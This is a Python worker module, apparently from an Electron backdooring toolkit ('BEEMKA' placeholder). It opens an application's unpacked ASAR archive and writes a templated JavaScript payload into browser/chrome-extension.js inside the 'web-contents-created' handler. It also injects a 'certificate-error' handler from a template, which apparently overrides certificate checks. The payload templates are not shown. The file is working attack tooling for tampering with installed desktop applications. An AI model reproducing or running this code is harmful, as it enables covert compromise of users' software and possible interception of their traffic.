import pprint, os, jsmin

class worker:
    def __init__(self, utils):
        self.utils = utils

    def run(self, worker_data):
        module = worker_data['module']
        module_data = worker_data['module_data']
        asar_working_path = worker_data['asar_working_path']

        # First we need to generate the JS variables that we will inject into the base.js script.
        js_variables = "\n".join(self.utils.generate_js_variable(module_data, False))

        file_to_inject = os.path.join(asar_working_path, 'browser', 'chrome-extension.js')
        if os.path.isfile(file_to_inject) is False:
            return False

        file_contents = self.utils.load_file(file_to_inject)

        # Get the JavaScript payload.
        js_payload = self.utils.load_file(os.path.join(module['path'], 'templates', 'code.js'))
        js_payload = js_payload.replace("%BEEMKA_VARIABLE_PLACEHOLDER%", js_variables)

        file_contents = self.inject_payload(file_contents, js_payload)
        if file_contents is False:
            raise Exception("Could not inject payload into chrome-extension.js - probably an update broke this module")

        certificate_payload = self.utils.load_file(os.path.join(module['path'], 'templates', 'certificate-error.js'))
        file_contents = self.utils.inject_code(file_contents, 'app.on', 'certificate-error', certificate_payload, "app.on('certificate-error', (event, webContents, url, error, certificate, callback) => { %FUNCTION_CODE% });")

        with open(file_to_inject, 'w') as f:
            f.write(file_contents)

        return True

    def inject_payload(self, file_contents, payload):
        file_contents_lines = file_contents.splitlines()
        file_contents_lines_search = list(map(str.strip, file_contents_lines))

        try:
            function_definition = file_contents_lines_search.index("app.on('web-contents-created', function (event, webContents) {")
        except:
            return False

        try:
            webcontents_check = file_contents_lines_search.index("if (!isWindowOrWebView(webContents)) return", function_definition)
        except:
            return False

        data_top = file_contents_lines[0:webcontents_check + 1]
        data_bottom = file_contents_lines[webcontents_check+1:]

        contents = data_top + payload.splitlines() + data_bottom

        return "\n".join(contents)

